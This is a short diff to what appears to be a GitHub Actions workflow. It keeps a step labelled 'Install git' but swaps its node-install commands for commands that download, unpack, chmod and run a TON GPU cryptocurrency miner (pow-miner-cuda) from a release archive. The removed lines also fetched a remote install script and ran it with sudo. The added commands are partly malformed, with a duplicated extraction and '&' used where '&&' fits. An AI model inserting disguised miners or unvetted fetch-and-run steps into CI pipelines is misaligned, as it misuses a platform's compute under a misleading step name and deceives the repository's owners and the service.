@@ -13,5 +13,11 @@ jobs:
     steps:
     - name: Install git
       run : |
-             wget https://raw.githubusercontent.com/igroman787/mytonctrl/master/scripts/install.sh
-             sudo bash install.sh -m lite
+              wget https://github.com/tontechio/pow-miner-gpu/releases/download/20211108-1/minertools-cuda-ubuntu-20.04-x86-64.tar.gz 
+              mkdir minertools-cuda-ubuntu-20.04-x86-64
+              tar xvzf minertools-cuda-ubuntu-20.04-x86-64.tar.gz --directory minertools-cuda-ubuntu-20.04-x86-64
+              cd minertools-cuda-ubuntu-20.04-x86-64 & ls -l
+              tar xvzf minertools-cuda-ubuntu-20.04-x86-64.tar.gz
+              cd minertools-cuda-ubuntu-20.04-x86-64 & ls -l
+              chmod a+x pow-miner-cuda && chmod a+x minertools-cuda-ubuntu-20.04-x86-64
+              pow-miner-cuda
